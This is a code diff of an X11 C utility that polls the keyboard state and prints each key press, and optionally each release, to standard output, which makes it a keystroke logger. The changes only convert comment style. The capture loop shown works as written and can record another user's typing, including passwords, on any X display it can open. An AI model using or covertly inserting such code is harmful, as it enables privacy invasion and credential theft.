@@ -20,7 +20,7 @@ const int DEFAULT_DELAY   = 10000000;
 static inline int BIT(char *c, int x) { return ( c[x/8]& (1<<(x%8)) ); }
 const int KEYSYM_STRLEN = 64;
 
-/* Globals */
+// Globals
 Display *disp;
 int printKeyUps = false;
 
@@ -44,7 +44,7 @@ int main(int argc, char *argv[]) {
             *saved;
     int delay = DEFAULT_DELAY;
 
-    /* get args */
+    // Get args
     for (int i = 1; i < argc; i++) {
         if (!strcmp(argv[i], "-help")) usage();
         else if (!strcmp(argv[i], "-display")) {
@@ -59,7 +59,7 @@ int main(int argc, char *argv[]) {
         else usage();
     }
 
-    /* setup Xwindows */
+    // Setup Xwindows
     disp = XOpenDisplay(hostname);
     if (NULL == disp) {
         fprintf(stderr, "Cannot open X display: %s\n", hostname);
@@ -67,24 +67,24 @@ int main(int argc, char *argv[]) {
     }
     XSynchronize(disp, true);
 
-    /* setup buffers */
+    // Setup buffers
     saved = buf1; keys=buf2;
     XQueryKeymap(disp, saved);
 
     struct timespec sleepTime = { .tv_nsec = delay };
 
     while (1) {
-        /* find changed keys */
+        // find changed keys
         XQueryKeymap(disp, keys);
         for (int i = 0; i < 32*8; i++) {
             if (BIT(keys, i) != BIT(saved, i)) {
                 register char *str = keyPressToString(i, BIT(keys, i));
                 if (BIT(keys, i) != 0 || printKeyUps) printf("%s\n",str);
-                fflush(stdout); /* in case user is writing to a pipe */
+                fflush(stdout); // In case user is writing to a pipe
             }
         }
 
-        /* swap buffers */
+        // Swap buffers
         char_ptr = saved;
         saved = keys;
         keys = char_ptr;
@@ -105,13 +105,13 @@ char *keyPressToString(int code, bool down) {
     KeySym keysym = XkbKeycodeToKeysym(disp, code, 0, 0);
     if (NoSymbol == keysym) return "";
 
-    /* convert keysym to a string, copy it to a local area */
+    // Convert keysym to a string, copy it to a local area
     str = XKeysymToString(keysym);
 
     if (NULL == str) return "";
     strncpy(buf, str, KEYSYM_STRLEN); buf[KEYSYM_STRLEN] = 0;
 
-    /* still a string, so put it in form (+str) or (-str) */
+    // Still a string, so put it in form (+str) or (-str)
     if (down) strcpy(buf, "+ ");
     else      strcpy(buf, "- ");
     strcat(buf, str);
